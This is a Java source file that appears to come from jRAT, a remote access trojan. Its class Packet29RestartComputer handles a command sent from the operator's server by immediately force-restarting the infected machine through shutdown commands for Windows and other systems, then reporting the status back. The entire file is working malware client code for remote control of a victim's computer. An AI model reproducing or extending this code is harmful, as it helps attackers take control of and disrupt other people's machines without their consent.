package jrat.client.packets.incoming;

import jrat.client.Connection;
import jrat.common.Constants;
import oslib.OperatingSystem;

public class Packet29RestartComputer implements IncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		try {
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				Runtime.getRuntime().exec("shutdown.exe -t 0 -r -f");
			} else {
				Runtime.getRuntime().exec("shutdown -r now");
			}
			
			con.status(Constants.STATUS_STARTING_SHUTDOWN);
		} catch (Exception ex) {
			ex.printStackTrace();
			con.status(Constants.STATUS_FAILED_SHUTDOWN);
		}
	}

}
